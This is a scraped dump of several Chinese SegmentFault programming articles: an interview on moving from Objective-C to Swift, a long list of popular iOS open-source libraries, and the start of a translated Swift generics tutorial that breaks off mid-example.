<p>Objective-C曾经是一门功能非常强大的语言。它与C++的主要区别是它是一种动态语言。在任何一门面向对象的语言中，都需要将函数绑定到它们处理的具体数据，而这一绑定要么在编译代码时进行，要么在运行时进行。C++使用静态绑定，这会提高运行时性能，但降低了灵活性。Objective-C采用动态绑定，它要稍慢一些，但大大增强了语言的灵活性。</p>
<p>然而，Objective-C也有自己的问题。因为它是以C语言为基础的，所以它从父语言那里继承了大量古怪的特性，比如预处理器和指针运算。这些功能尽管非常强大，但会降低代码的可读性和安全性。苹果公司在保持Objective-C的现代化方面做得非常出色，但即使是这门语言的死忠粉也认为这门语言有些过时了。</p>
<p>于是Swift应运而生了。Swift是一门新的语言，旨在让iOS和Mac应用程序的开发变得更轻松、更快速、更安全。它的设计目标是更容易掌握，且在防范程序员错误方面比Objective-C做得更好；事实上，苹果公司将它描述为“没有C的Objective-C”。因为Swift是用LLVM（Objective-C使用的工具集）生成和编译的，而且使用了Objective-C运行时，所以我们可以编写一个同时使用C、Objective-C和Swift的App。</p>
<p><strong>问：在学习Swift之前，是否有必要学习C语言？</strong></p>
<p>不需要！你可以把Swift作为开始，这是一种伟大、有趣、简单，而且安全的语言。当你想要理解程序的内在工作方式时，你可以稍后再学习C语言。</p>
<p><strong>问：一位iOS开发高手需要掌握什么样的知识框架？</strong></p>
<p>我也会做很多设计——构建好的移动应用（或者现今任何形式的应用）需要好的设计感！学习设计吧，因为设计能够更好地影响他人。</p>
<hr>
<h4>更多精彩，加入图灵访谈微信！</h4>
<p><span class=""img-wrap""><img data-src=""/img/bVkfQ4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", 《Swift与Cocoa框架开发》作者Paris Buttfield-Addison：你的编程生涯可以从Swift开始！,1531972088,480,1,767,1,1,https://segmentfault.com/a/1190000003849401
136,1,0,6,"
                    
<p>综合github上各个项目的关注度与具体使用情况,涵盖功能,UI,数据库,自动化测试,编程工具等类型,看完,还敢自称”精通iOS开发”吗?</p>
<ul>
<li><p><a href=""https://github.com/syedhali/EZAudio"" rel=""nofollow noreferrer""></a><a href=""https://github.com/syedhali/EZAudio"" rel=""nofollow noreferrer"">https://github.com/syedhali/EZAudio</a> 基于核心音频,有助于进行实时，低延迟音频处理和可视化的iOS和OSX音频可视化框架。</p></li>
<li><p><a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer""></a><a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer"">https://github.com/bang590/JSPatch</a> JSPatch使用Objective-C运行时桥接Objective-C和Javascript。你可以只包括一个此库,就可以通过JavaScript调用Objective-C中的任何类和方法。 JSPatch一般用于动态修复iOS应用程序。</p></li>
<li><p><a href=""https://github.com/Jawbone/JBChartView"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Jawbone/JBChartView"" rel=""nofollow noreferrer"">https://github.com/Jawbone/JBChartView</a> 基于iOS的用于线路和条形图的图表库。</p></li>
<li><p><a href=""https://github.com/danielgindi/ios-charts"" rel=""nofollow noreferrer""></a><a href=""https://github.com/danielgindi/ios-charts"" rel=""nofollow noreferrer"">https://github.com/danielgindi/ios-charts</a> 一个美丽MPAndroidChart的IOS版本.- 用于iOS应用的美丽图表！</p></li>
<li><p><a href=""https://github.com/rentzsch/mogenerator"" rel=""nofollow noreferrer""></a><a href=""https://github.com/rentzsch/mogenerator"" rel=""nofollow noreferrer"">https://github.com/rentzsch/mogenerator</a> Core Data 代码生成器.</p></li>
<li><p><a href=""https://github.com/realm/realm-cocoa"" rel=""nofollow noreferrer""></a><a href=""https://github.com/realm/realm-cocoa"" rel=""nofollow noreferrer"">https://github.com/realm/realm-cocoa</a></p></li>
<li><p><a href=""https://github.com/realm/realm-cocoa"" rel=""nofollow noreferrer""></a><a href=""https://github.com/realm/realm-cocoa"" rel=""nofollow noreferrer"">https://github.com/realm/realm-cocoa</a> Realm 是移动端专用 数据库：用于替换核心数据与SQLite</p></li>
<li><p><a href=""https://github.com/yapstudios/YapDatabase"" rel=""nofollow noreferrer""></a><a href=""https://github.com/yapstudios/YapDatabase"" rel=""nofollow noreferrer"">https://github.com/yapstudios/YapDatabase</a> YapDatabase是一种用于iOS和Mac的可扩展的数据库。</p></li>
<li><p><a href=""https://github.com/Marxon13/M13ProgressSuite"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Marxon13/M13ProgressSuite"" rel=""nofollow noreferrer"">https://github.com/Marxon13/M13ProgressSuite</a>含有许多工具套件，以在iOS上显示进度信息。</p></li>
<li><p><a href=""https://github.com/mxcl/PromiseKit"" rel=""nofollow noreferrer""></a><a href=""https://github.com/mxcl/PromiseKit"" rel=""nofollow noreferrer"">https://github.com/mxcl/PromiseKit</a> 用于iOS和OS X的Promises</p></li>
<li><p><a href=""https://github.com/SwiftyJSON/SwiftyJSON"" rel=""nofollow noreferrer""></a><a href=""https://github.com/SwiftyJSON/SwiftyJSON"" rel=""nofollow noreferrer"">https://github.com/SwiftyJSON/SwiftyJSON</a> 用于处理Swift中的JSON数据的更好方法</p></li>
<li><p><a href=""https://github.com/stig/json-framework"" rel=""nofollow noreferrer""></a><a href=""https://github.com/stig/json-framework"" rel=""nofollow noreferrer"">https://github.com/stig/json-framework</a> JSON（JavaScript对象符号）是一种轻量的数据交换格式，易于读写人类和计算机一样。该框架实现了用在Objective-C严格的JSON解析器和编码器。</p></li>
<li><p><a href=""https://github.com/SnapKit/SnapKit"" rel=""nofollow noreferrer""></a><a href=""https://github.com/SnapKit/SnapKit"" rel=""nofollow noreferrer"">https://github.com/SnapKit/SnapKit</a> 一个可用于为iOS和OS X的Swift自动布局DSL</p></li>
<li><p><a href=""https://github.com/robb/Cartography"" rel=""nofollow noreferrer""></a><a href=""https://github.com/robb/Cartography"" rel=""nofollow noreferrer"">https://github.com/robb/Cartography</a> 一个用于Swift的声明性自动布局DSL</p></li>
<li><p><a href=""https://github.com/CocoaLumberjack/CocoaLumberjack"" rel=""nofollow noreferrer""></a><a href=""https://github.com/CocoaLumberjack/CocoaLumberjack"" rel=""nofollow noreferrer"">https://github.com/CocoaLumberjack/CocoaLumberjack</a>快速和简单，但功能强大而灵活的日志框架适用于Mac和iOS</p></li>
<li><p><a href=""https://github.com/fpillet/NSLogger"" rel=""nofollow noreferrer""></a><a href=""https://github.com/fpillet/NSLogger"" rel=""nofollow noreferrer"">https://github.com/fpillet/NSLogger</a> 一个现代化的，灵活的日志工具</p></li>
<li><p><a href=""https://github.com/Haneke/HanekeSwift"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Haneke/HanekeSwift"" rel=""nofollow noreferrer"">https://github.com/Haneke/HanekeSwift</a> 一个用于iOS的轻量级通用的高速缓存库,使用Swift编写,对图像有特别优化.</p></li>
<li><p><a href=""https://github.com/vfr/Reader"" rel=""nofollow noreferrer""></a><a href=""https://github.com/vfr/Reader"" rel=""nofollow noreferrer"">https://github.com/vfr/Reader</a>iOS PDF阅读器核心库</p></li>
<li><p><a href=""https://github.com/robbiehanson/XMPPFramework"" rel=""nofollow noreferrer""></a><a href=""https://github.com/robbiehanson/XMPPFramework"" rel=""nofollow noreferrer"">https://github.com/robbiehanson/XMPPFramework</a>一个XMPP架构,使用Objective-C编写,适用于Mac和iOS</p></li>
<li><p><a href=""https://github.com/Alamofire/Alamofire"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Alamofire/Alamofire"" rel=""nofollow noreferrer"">https://github.com/Alamofire/Alamofire</a>优雅的HTTP网络库,使用Swift编写</p></li>
<li><p><a href=""https://github.com/Cocoanetics/DTCoreText"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Cocoanetics/DTCoreText"" rel=""nofollow noreferrer"">https://github.com/Cocoanetics/DTCoreText</a> 方法集,允许在CoreText中使用HTML代码</p></li>
<li><p><a href=""https://github.com/mdiep/MMMarkdown"" rel=""nofollow noreferrer""></a><a href=""https://github.com/mdiep/MMMarkdown"" rel=""nofollow noreferrer"">https://github.com/mdiep/MMMarkdown</a>一个Objective-C的静态库,用于将Markdown语法转换换为HTML。</p></li>
<li><p><a href=""https://github.com/usebutton/DeepLinkKit"" rel=""nofollow noreferrer""></a><a href=""https://github.com/usebutton/DeepLinkKit"" rel=""nofollow noreferrer"">https://github.com/usebutton/DeepLinkKit</a>极佳的路线匹配方式，基于块的方法来处理你的深层链接。</p></li>
<li><p><a href=""https://github.com/KrauseFx/TSMessages"" rel=""nofollow noreferrer""></a><a href=""https://github.com/KrauseFx/TSMessages"" rel=""nofollow noreferrer"">https://github.com/KrauseFx/TSMessages</a> 易于使用和定制的消息/通知,用于 iOS版Tweetbot.</p></li>
<li><p><a href=""https://github.com/jessesquires/JSQMessagesViewController"" rel=""nofollow noreferrer""></a><a href=""https://github.com/jessesquires/JSQMessagesViewController"" rel=""nofollow noreferrer"">https://github.com/jessesquires/JSQMessagesViewController</a> 一个优雅的iOS信息UI库</p></li>
<li><p><a href=""https://github.com/Grouper/FlatUIKit"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Grouper/FlatUIKit"" rel=""nofollow noreferrer"">https://github.com/Grouper/FlatUIKit</a>令人惊叹的iOS扁平化UI组件集合。</p></li>
<li><p><a href=""https://github.com/ViccAlexander/Chameleon"" rel=""nofollow noreferrer""></a><a href=""https://github.com/ViccAlexander/Chameleon"" rel=""nofollow noreferrer"">https://github.com/ViccAlexander/Chameleon</a>iOS (Obj-C &amp; Swift)扁平化颜色框架</p></li>
<li><p><a href=""https://github.com/bryankeller/"" rel=""nofollow noreferrer""></a><a href=""https://github.com/bryankeller/BLKFlexibleHeightBar"" rel=""nofollow noreferrer"">https://github.com/bryankeller/BLKFlexibleHeightBar</a> 用BLKFlexibleHeightBar创建缩合的iOS应用程序标题栏就像出现在Facebook，Square Cash，和Safari浏览器的一样。</p></li>
<li><p><a href=""https://github.com/victorBaro/VBFPopFlatButton"" rel=""nofollow noreferrer""></a><a href=""https://github.com/victorBaro/VBFPopFlatButton"" rel=""nofollow noreferrer"">https://github.com/victorBaro/VBFPopFlatButton</a>扁平化风格的按钮在9个不同的国家使用POP</p></li>
<li><p><a href=""https://github.com/hackiftekhar/IQKeyboardManager"" rel=""nofollow noreferrer""></a><a href=""https://github.com/hackiftekhar/IQKeyboardManager"" rel=""nofollow noreferrer"">https://github.com/hackiftekhar/IQKeyboardManager</a>(IQKeyboardManager）无代码插入式通用库,可以防止键盘滑动起来的问题，涵盖的UITextField/ UITextView的。既不需要编写任何代码，也不需要任何设置等。</p></li>
<li><p><a href=""https://github.com/TransitApp/SVWebViewController"" rel=""nofollow noreferrer""></a><a href=""https://github.com/TransitApp/SVWebViewController"" rel=""nofollow noreferrer"">https://github.com/TransitApp/SVWebViewController</a>一个下拉内嵌浏览器为您的iOS应用提供帮助。</p></li>
<li><p><a href=""https://github.com/facebook/AsyncDisplayKit/"" rel=""nofollow noreferrer""></a><a href=""https://github.com/facebook/AsyncDisplayKit/"" rel=""nofollow noreferrer"">https://github.com/facebook/AsyncDisplayKit/</a>流畅的异步用户界面的的iOS应用程序。</p></li>
<li><p><a href=""https://github.com/layerhq/Atlas-iOS"" rel=""nofollow noreferrer""></a><a href=""https://github.com/layerhq/Atlas-iOS"" rel=""nofollow noreferrer"">https://github.com/layerhq/Atlas-iOS</a>Atlas是原生的iOS通信用户界面组件层的库。</p></li>
<li><p><a href=""https://github.com/telly/TLYShyNavBar"" rel=""nofollow noreferrer""></a><a href=""https://github.com/telly/TLYShyNavBar"" rel=""nofollow noreferrer"">https://github.com/telly/TLYShyNavBar</a>与那些所有嚣张的UINavigationBar比，这个是害羞，而且谦虚的！轻松创建自动滚动导航栏！</p></li>
<li><p><a href=""https://github.com/okmr-d/DOFavoriteButton"" rel=""nofollow noreferrer""></a><a href=""https://github.com/okmr-d/DOFavoriteButton"" rel=""nofollow noreferrer"">https://github.com/okmr-d/DOFavoriteButton</a>用Swift写可爱的动画按钮。* <a href=""https://github.com/ninjaprox/NVActivityIndicatorView"" rel=""nofollow noreferrer""></a><a href=""https://github.com/inFullMobile/WobbleView"" rel=""nofollow noreferrer"">https://github.com/inFullMobile/WobbleView</a>是在你的应用程序的任何视图最近受欢迎摆动效果的实现。它可以用于容易地动态添加到用户交互和过渡。* [<a href=""https://github.com/ninjaprox/NVActivityIndicatorView"" rel=""nofollow noreferrer"">https://github.com/ninjaprox/NVActivityIndicatorView</a>收集好的加载动画</p></li>
<li><p><a href=""https://github.com/devinross/tapkulibrary"" rel=""nofollow noreferrer""></a><a href=""https://github.com/devinross/tapkulibrary"" rel=""nofollow noreferrer"">https://github.com/devinross/tapkulibrary</a>tap + haiku = tapku，一个精心设计的开源的iOS框架</p></li>
<li><p><a href=""https://github.com/xmartlabs/XLForm"" rel=""nofollow noreferrer""></a><a href=""https://github.com/xmartlabs/XLForm"" rel=""nofollow noreferrer"">https://github.com/xmartlabs/XLForm</a>XLForm是最灵活和最强大的iOS库创建动态表视图形式。与Swift和Obj-C 完全兼容。</p></li>
<li><p><a href=""https://github.com/yoavlt/LiquidFloatingActionButton"" rel=""nofollow noreferrer""></a><a href=""https://github.com/yoavlt/LiquidFloatingActionButton"" rel=""nofollow noreferrer"">https://github.com/yoavlt/LiquidFloatingActionButton</a> 液态材料设计浮动的操作按钮</p></li>
<li><p><a href=""https://github.com/cwRichardKim/RKNotificationHub"" rel=""nofollow noreferrer""></a><a href=""https://github.com/cwRichardKim/RKNotificationHub"" rel=""nofollow noreferrer"">https://github.com/cwRichardKim/RKNotificationHub</a>做任何UIView的一个完全成熟的通知中心* <a href=""https://github.com/square/SocketRocket"" rel=""nofollow noreferrer""></a><a href=""https://github.com/square/SocketRocket"" rel=""nofollow noreferrer"">https://github.com/square/SocketRocket</a>一个符合的Objective-C的WebSocket客户端库。</p></li>
<li><p><a href=""https://github.com/realm/SwiftLint"" rel=""nofollow noreferrer""></a><a href=""https://github.com/realm/SwiftLint"" rel=""nofollow noreferrer"">https://github.com/realm/SwiftLint</a>实验工具来执行Swift风格和约定。..</p></li>
<li><p><a href=""https://github.com/facebook/chisel"" rel=""nofollow noreferrer""></a><a href=""https://github.com/facebook/chisel"" rel=""nofollow noreferrer"">https://github.com/facebook/chisel</a>确切的LLDB集合命令来帮助调试的iOS应用程序。</p></li>
<li><p><a href=""https://github.com/Flipboard/FLEX"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Flipboard/FLEX"" rel=""nofollow noreferrer"">https://github.com/Flipboard/FLEX</a>一个为iOS在应用程序的调试和探测工具</p></li>
<li><p><a href=""https://github.com/krzysztofzablocki/KZBootstrap"" rel=""nofollow noreferrer""></a><a href=""https://github.com/krzysztofzablocki/KZBootstrap"" rel=""nofollow noreferrer"">https://github.com/krzysztofzablocki/KZBootstrap</a><br>iOS的项目引导瞄准高质量的编码。</p></li>
<li><p><a href=""https://github.com/mattt/GroundControl"" rel=""nofollow noreferrer""></a><a href=""https://github.com/mattt/GroundControl"" rel=""nofollow noreferrer"">https://github.com/mattt/GroundControl</a>为iOS远程配置</p></li>
<li><p><a href=""https://github.com/supermarin/ObjectiveSugar"" rel=""nofollow noreferrer""></a><a href=""https://github.com/supermarin/ObjectiveSugar"" rel=""nofollow noreferrer"">https://github.com/supermarin/ObjectiveSugar</a> ObjectiveC新增于人类。 Ruby的风格。</p></li>
<li><p><a href=""https://github.com/EvgenyKarkan/EKAlgorithms"" rel=""nofollow noreferrer""></a><a href=""https://github.com/EvgenyKarkan/EKAlgorithms"" rel=""nofollow noreferrer"">https://github.com/EvgenyKarkan/EKAlgorithms</a>EKAlgorithms）EKAlgorithms包含一些知名的CS算法和数据结构。</p></li>
<li><p><a href=""https://github.com/robb/Underscore.m"" rel=""nofollow noreferrer""></a><a href=""https://github.com/robb/Underscore.m"" rel=""nofollow noreferrer"">https://github.com/robb/Underscore.m</a>DSL数据操作</p></li>
<li><p><a href=""https://github.com/matthewpalmer/Locksmith"" rel=""nofollow noreferrer""></a><a href=""https://github.com/matthewpalmer/Locksmith"" rel=""nofollow noreferrer"">https://github.com/matthewpalmer/Locksmith</a>一个强大的面向协议库，与Swift的钥匙串工作。</p></li>
<li><p><a href=""https://github.com/jspahrsummers/libextobjc"" rel=""nofollow noreferrer""></a><a href=""https://github.com/jspahrsummers/libextobjc"" rel=""nofollow noreferrer"">https://github.com/jspahrsummers/libextobjc</a>Cocoa库扩展的Objective-C编程语言.</p></li>
<li><p><a href=""https://github.com/square/Valet"" rel=""nofollow noreferrer""></a><a href=""https://github.com/square/Valet"" rel=""nofollow noreferrer"">https://github.com/square/Valet</a>代客可以让你安全地存储在iOS和OS X的钥匙串数据，而无需了解的钥匙扣如何工作的事情。 小菜一碟。我们承诺。</p></li>
<li><p><a href=""https://github.com/kishikawakatsumi/UICKeyChainStore"" rel=""nofollow noreferrer""></a><a href=""https://github.com/kishikawakatsumi/UICKeyChainStore"" rel=""nofollow noreferrer"">https://github.com/kishikawakatsumi/UICKeyChainStore</a>UICKeyChainStore是一个简单的包装钥匙串上的iOS。使得使用钥匙串的API一样容易的NSUserDefaults。</p></li>
<li><p><a href=""https://github.com/thoughtbot/liftoff"" rel=""nofollow noreferrer""></a><a href=""https://github.com/thoughtbot/liftoff"" rel=""nofollow noreferrer"">https://github.com/thoughtbot/liftoff</a>用于创建和配置新的Xcode项目的CLI</p></li>
<li><p><a href=""https://github.com/gh-unit/gh-unit"" rel=""nofollow noreferrer""></a><a href=""https://github.com/gh-unit/gh-unit"" rel=""nofollow noreferrer"">https://github.com/gh-unit/gh-unit</a>对于Objective-C的测试框架</p></li>
<li><p><a href=""https://github.com/AliSoftware/OHHTTPStubs"" rel=""nofollow noreferrer""></a><a href=""https://github.com/AliSoftware/OHHTTPStubs"" rel=""nofollow noreferrer"">https://github.com/AliSoftware/OHHTTPStubs</a>轻松存网络的要求！测试你的应用程序使用假网络数据和定制的响应时间，响应代码和头部！</p></li>
<li><p><a href=""https://github.com/Quick/Quick"" rel=""nofollow noreferrer""></a><a href=""https://github.com/Quick/Quick"" rel=""nofollow noreferrer"">https://github.com/Quick/Quick</a>Swift（和Objective-C）测试框架。</p></li>
<li><p><a href=""https://github.com/specta/specta"" rel=""nofollow noreferrer""></a><a href=""https://github.com/specta/specta"" rel=""nofollow noreferrer"">https://github.com/specta/specta</a>一个轻量级的TDD/ BDD框架的Objective-C和Cocoa</p></li>
<li><p><a href=""https://github.com/kiwi-bdd/Kiwi"" rel=""nofollow noreferrer""></a><a href=""https://github.com/kiwi-bdd/Kiwi"" rel=""nofollow noreferrer"">https://github.com/kiwi-bdd/Kiwi</a>简单的BDD为iOS</p></li>
<li><p><a href=""https://github.com/kif-framework/KIF"" rel=""nofollow noreferrer""></a><a href=""https://github.com/kif-framework/KIF"" rel=""nofollow noreferrer"">https://github.com/kif-framework/KIF</a>保持它的功能 - 在iOS功能测试框架</p></li>
<li><p><a href=""https://github.com/facebook/ios-snapshot-test-case"" rel=""nofollow noreferrer""></a><a href=""https://github.com/facebook/ios-snapshot-test-case"" rel=""nofollow noreferrer"">https://github.com/facebook/ios-snapshot-test-case</a>保持它的功能 - 在iOS功能测试框架</p></li>
<li><p><a href=""https://github.com/square/PonyDebugger"" rel=""nofollow noreferrer""></a><a href=""https://github.com/square/PonyDebugger"" rel=""nofollow noreferrer"">https://github.com/square/PonyDebugger</a>使用Chrome的开发人员工具,远程网络和数据调试您的本地iOS应用</p></li>
<li><p><a href=""https://github.com/krausefx/snapshot"" rel=""nofollow noreferrer""></a><a href=""https://github.com/krausefx/snapshot"" rel=""nofollow noreferrer"">https://github.com/krausefx/snapshot</a>自动把你的iOS应用程序的局部截图在每个设备上</p></li>
<li><p><a href=""https://github.com/krausefx/deliver"" rel=""nofollow noreferrer""></a><a href=""https://github.com/krausefx/deliver"" rel=""nofollow noreferrer"">https://github.com/krausefx/deliver</a>上传截图，元数据和您的应用程序在App Store使用一个命令</p></li>
<li><p><a href=""https://github.com/KrauseFx/fastlane"" rel=""nofollow noreferrer""></a><a href=""https://github.com/KrauseFx/fastlane"" rel=""nofollow noreferrer"">https://github.com/KrauseFx/fastlane</a>将所有iOS的部署工具为一个简化的工作流程</p></li>
<li><p><a href=""https://github.com/johnno1962/injectionforxcode"" rel=""nofollow noreferrer""></a><a href=""https://github.com/johnno1962/injectionforxcode"" rel=""nofollow noreferrer"">https://github.com/johnno1962/injectionforxcode</a>运行时代码注入的Objective-C和Swift</p></li>
<li><p><a href=""https://github.com/DyCI/dyci-main"" rel=""nofollow noreferrer""></a><a href=""https://github.com/DyCI/dyci-main"" rel=""nofollow noreferrer"">https://github.com/DyCI/dyci-main</a>对于Objective-C的动态代码注入工</p></li>
<li><p><a href=""https://github.com/krzysztofzablocki/KZPlayground"" rel=""nofollow noreferrer""></a><a href=""https://github.com/krzysztofzablocki/KZPlayground"" rel=""nofollow noreferrer"">https://github.com/krzysztofzablocki/KZPlayground</a>Playgrounds for Objective-C</p></li>
</ul>

                "," 盘点国内程序员不常用的热门iOS第三方库:看完,还敢自称”精通iOS开发”吗?",1531972090,386,1,894,1,1,https://segmentfault.com/a/1190000003849085
137,1,0,6,"
                    
<blockquote><p><a href=""http://austinzheng.com/2015/09/29/swift-generics-pt-2/"" rel=""nofollow noreferrer"">Generics in Swift</a></p></blockquote>
<h2>Swift 中的泛型编程</h2>
<p>本文中，笔者旨在对于Swift中的泛型编程进行一个综合性描述。读者可以查看<a href=""http://austinzheng.com/2015/01/02/swift-generics-pt-1/"" rel=""nofollow noreferrer"">上一篇</a> 系列中的描述来看之前笔者的论文。泛型编程是编程方式的一种，主要是一些譬如类、结构体以及枚举这样的复杂类型以及函数可以使用类型参数进行定义(type parameters)。类型参数可以看做是真实类型的占位符，当泛型或者函数被使用时才会被真实类型替换。</p>
<p>在Swift中，对于泛型编程最直观的表现当属Array这个类型。在Objective-C中，Array的示例NSArray可以包含任意类型的对象。但是，Swift中的Array类型需要在声明时即指定它们包含的元素类型，，譬如Array&lt;Int&gt;, Array&lt;UIView&gt;。Array与Int都是一种数据类型，泛型机制允许这两种类型有机组合起来从而能够传递更多的额外的信息。</p>
<p>备注：在Swift中惯用的声明Array包含了Foo类型的用法是<code>[Foo]</code>这种语法，而本文中使用<code>Array&lt;Foo&gt;</code>写法旨在帮助理解以及强调Array是一个通用泛型。</p>
<h3>Why generics (为什么使用泛型)？</h3>
<p>这里列举出几个静态类型语言中使用泛型编程的原因：</p>
<ul>
<li><p>类型安全：类似于Array这样的容器类型，可以给出它们存放的具体的元素的类型，从而告知编译器可以插入容器中的对象的类型以及从容器中返回的对象的类型。这种机制作用于所有可以被当做Array参数的类型，并且也作用于类型之间的关系。</p></li>
<li><p>减少冗余代码：有些情况下需要对多个数据类型进行相同的操作，可以用一个泛型方程来代替多个不同类型参数或者返回值的重复的方程。这样可以避免潜在的代码错误等等。</p></li>
<li><p>灵活的依赖库：第三方库可以暴露一些接口，从而避免使用这些接口的开发者被强制使用或者类型或者返回值为一个固定的类型。它们可以使用泛型进行更加抽象地编程，举例来说，泛型会允许一个接口来接受不仅仅是一个Array参数，而是一个Collection参数。</p></li>
</ul>
<h2>Generic entities (泛型实体)</h2>
<p>Swift中的泛型编程主要表现在以下两个不同的情况下：当定义某个类型或者定义某个函数时。泛型类型的特性以及<code>&lt;</code>与<code>&gt;</code>这两个关键字往往意味着某个类型或者函数是泛型。</p>
<h3>Generic types (泛型类型)</h3>
<p>Swift中主要的三个用户可自定义的类型可以被当做泛型，下面就以Result枚举类型为例，该类型中存放了表征成功的Success以及表征失败的Failure：</p>
<pre><code class=""swift"">enum Result&lt;T, U&gt; {
  case Success(T)
  case Failure(U)
}</code></pre>
<p>在Result类型之后有两个类型参数： T以及U。这些类型参数将会在创建实例时被替换为真实的类型：</p>
<pre><code class=""swift"">let aSuccess : Result&lt;Int, String&gt; = .Success(123)
let aFailure : Result&lt;Int, String&gt; = .Failure(""temperature too high"")</code></pre>
<p>泛型类型的类型参数可以被用于以下的几个方面：</p>
<ul>
<li><p>作为属性的类型</p></li>
<li><p>作为枚举体中的关联类型</p></li>
<li><p>作为某个方法的返回值或者参数</p></li>
<li><p>作为构造器的参数类型</p></li>
<li><p>作为另一个泛型的类型参数，譬如<code>Array</code></p></li>
</ul>
<p>泛型可以在以下两种方式中被初始化：</p>
<ul>
<li><p>在创建新的实例时，类型参数被用户给出的真实的数据类型替换。</p></li>
<li><p>类型被推导得出，通过调用初始化器或者静态方法来创建某个实例。</p></li>
</ul>
<pre><code class=""swift"">struct Queue&lt;T&gt; { /* ... */ }

// First way to instantiate
let a1 : Queue&lt;Int&gt; = Queue()
let a2 : Queue&lt;Int&gt; = Queue.staticFactoryMethod() // or just .staticFactoryMethod()

// Second way to instantiate
let b1 = Queue&lt;Int&gt;()
let b2 = Queue&lt;Int&gt;.staticFactoryMethod()</code></pre>
<p>注意，像T这样的类型参数在类型定义时出现，无论这个类型何时被调用，这些类型参数都会被替换为真实的类型。举例而言，<code>Array&lt;String&gt;</code>或者<code>Array&lt;UIWindow&gt;</code>，便是以固定类型初始化的数组。而如果是像<code>Array&lt;T&gt;</code>这样的，它便一直处于由其他类型或者函数作为类型参数定义的上下文中。</p>
<h3>Generic functions (泛型函数)</h3>
<p>函数、方法、属性、下标以及初始化器都可以当做泛型进行处理，它们自身可以成为泛型或者存在于某个泛型类型的上下文中：</p>
<pre><code class=""swift"">// Given an item, return an array with that item repeated n times
func duplicate&lt;T&gt;(item: T, numberOfTimes n: Int) -&gt; [T] {
  var buffer : [T] = []
  for _ in 0 ..&lt; n {
    buffer.append(item)
  }
  return buffer
}</code></pre>
<p>同样的，类型参数是定义在<code>&lt;</code>与<code>&gt;</code>紧跟在函数名之后。它主要可以用于以下几个方面：</p>
<ul>
<li><p>作为某个函数的参数</p></li>
<li><p>作为函数的返回值</p></li>
<li><p>作为另一个泛型类型的类型参数，譬如<code>T</code>可以作为<code>Array&lt;T?&gt;</code>中的一部分</p></li>
</ul>
<p>当然，如果所有的类型参数都是未用状态编译器会不太友好。而泛型方法可以同时定义在泛型类型与非泛型类型上：</p>
<pre><code class=""swift"">extension Result {
  // Transform the value of the 'Result' using one of two mapping functions
  func transform&lt;V&gt;(left: T -&gt; V, right: U -&gt; V) -&gt; V {
    switch self {
    case .Success(let value): return left(value)
    case .Failure(let value): return right(value)
    }
  }
}</code></pre>
<p>上述中的<code>transform</code>方法就是泛型方法，存放于泛型类型<code>Result</code>中。除了由Result中定义的类型参数T、U，泛型方法本身也定义了一个泛型参数V。当调用一个泛型方程时，不一定需要指明清楚传入的类型参数。编译器的类型推导接口会自动根据参数与返回类型推导出相关信息：</p>
<pre><code class=""swift"">// Example use of the 'duplicate:numberOfTimes:' function defined earlier.
// T is inferred to be Int.
let a = duplicate(52, numberOfTimes: 10)</code></pre>
<p>实际上，尝试去清楚地设置参数类型还会引发错误：</p>
<pre><code class=""swift"">// Does not compile
// Error: ""Cannot explicitly specialize a generic function""
let b = duplicate&lt;String&gt;(""foo"", numberOfTimes: 5)</code></pre>
<h2>Associated types (关联类型)</h2>
<p>Swift中的Protocol不可以使用类型参数定义泛型，不过Protocol可以使用<code>typealias</code>关键字来定义一些关联类型：</p>
<pre><code class=""swift"">// A protocol for things that can accept food.
protocol FoodEatingType {
  typealias Food

  var isSatiated : Bool { get }
  func feed(food: Food)
}</code></pre>
<p>在这个实例中，Food是定义在FoodEatingType协议中的关联类型，而某个协议中的关联类型数目可以根据实际的需求数量定义。</p>
<p>关联类型，类似于类型参数，都是一种占位符。而后面如果某个类需要实现这个协议，则需要确定<code>Food</code>的具体类型，是Hay还是Rabbit。具体的做法就是继承并且实现协议的属性与方法，并在实现时再判断应该用哪些真实的数据类型去替换这些关联类型：</p>
<pre><code class=""swift"">class Koala : FoodEatingType {
  var foodLevel = 0
  var isSatiated : Bool { return foodLevel &lt; 10 }

  // Koalas are notoriously picky eaters
  func feed(food: Eucalyptus) {
    // ...
    if !isSatiated {
      foodLevel += 1
    }
  }
}</code></pre>
<p>对于<code>Koala</code>这个具体的实现者，关联类型Food被定义为了<code>Eucalyptus</code>，换言之，也就是<code>Koala.Food</code>被定义为了<code>Eucalyptus</code>。如果某个类型实现了多个协议，那么对于每个协议中的关联类型也都必须实现。而如果某个继承的类型也是个泛型，也可以使用类型参数去帮助确定关联类型：</p>
<pre><code class=""swift"">// Gourmand Wolf is a picky eater and will only eat his or her favorite food.
// Individual wolves may prefer different foods, though.
class GourmandWolf&lt;FoodType&gt; : FoodEatingType {
  var isSatiated : Bool { return false }

  func feed(food: FoodType) {
    // ...
  }
}

let meela = GourmandWolf&lt;Rabbit&gt;()
let rabbit = Rabbit()
meela.feed(rabbit)</code></pre>
<p>在上述代码中, <code>GourmandWolf&lt;Goose&gt;.Food</code> 即 <code>Goose</code>, 而 <code>GourmandWolf&lt;Sheep&gt;.Food</code> 即 <code>Sheep</code>。顺便说一句，协议中的关联类型虽然属于泛型，但也可以为其添加一些约束或者父类。譬如我们定义的某个协议中为Heap添加了一些列的操作，并且要保证所有的Heap的Key是可比较的，即必须是Comparable的子类或者实现，那么可以添加如下约束：</p>
<pre><code class=""swift"">// Types that conform represent simple max-heaps which use their elements as keys
protocol MaxHeapType {
  // Elements must support comparison ops; e.g. 'a is greater than b'.
  typealias Element : Comparable

  func insert(x: Element)
  func findMax() -&gt; Element?
  func deleteMax() -&gt; Bool
}</code></pre>
<h2>Type constraints (类型约束)</h2>
<p>截至目前，我们提及的泛型，诸如T以及U可以用任意类型来替换。而标准库中的Array类型即是这样一种无任何约束的典型，可以由其类型参数来决断。譬如下面一个例子中，需要编写一个函数，输入一个数组而获取数组中最大的那个值并且返回：</p>
<pre><code class=""swift"">// Doesn't compile.
